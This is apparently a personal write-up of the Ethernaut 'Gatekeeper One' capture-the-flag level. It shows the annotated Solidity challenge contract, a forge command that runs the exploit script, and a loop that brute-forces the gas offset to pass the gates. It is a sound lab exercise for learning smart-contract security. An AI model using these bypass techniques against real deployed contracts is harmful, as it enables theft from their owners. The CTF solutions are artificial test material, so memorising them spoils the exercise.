
## 13 - Gatekeeper One

#### Author note:
Make it past the gatekeeper and register as an entrant to pass this level.
Things that might help:

*    Remember what you've learned from the Telephone and Token levels.
*    You can learn more about the special function gasleft(), in Solidity's documentation (see Units and Global Variables and External Function Calls).


- [challenge](src/13_GatekeeperOne.sol)

```Solidity
contract GatekeeperOne {
    address public entrant;

	// must call the contract through another contract (not directly from EOA).
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

	//The remaining gas at that exact check must be divisible by 8191.
	// Solution: brute-force the gas offset using a loop in the attacker contract.
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

	// _gateKey must be derived from tx.origin. based on the third stmt.
	// This is supposed to teach about downcasting and masking.
    modifier gateThree(bytes8 _gateKey) {
		// compare  the last 4 bytes (32/8)    with   last 2 bytes (16/8)
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
		// to compare it will use masking, the upper part of the _gateKey must be zeroed out
		// 0x ... 00 00 77 88

		// this just want to make sure we didn't zero everything
		// we need some dirty bytes in the beginning. it doesn't matter moving fwd.
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");

		// oh, so the last 2 bytes must be from our address. bet.
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

	// The function we need to exploit 
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

- [exploit](script/13_GatekeeperOneSolve.s.sol)
```
❮ forge script script/13_GatekeeperOneSolve.s.sol --tc Exploit \ 
    --rpc-url $RPC_URL --private-key $PK 
```

For the bruteforce part, i took the estimation number from [cmichel](https://cmichel.io/ethernaut-solutions/)
* [seemore](https://stermi.xyz/blog/ethernaut-challenge-13-solution-gatekeeper-one)
```Solidity
		for (uint256 i; i < 8191; i++) {
			try target.enter{gas: 800000 + i}(gateKey) {
				console2.log("passed with gas ->", 800000 + i);
				break;
			} catch {}
		}
```
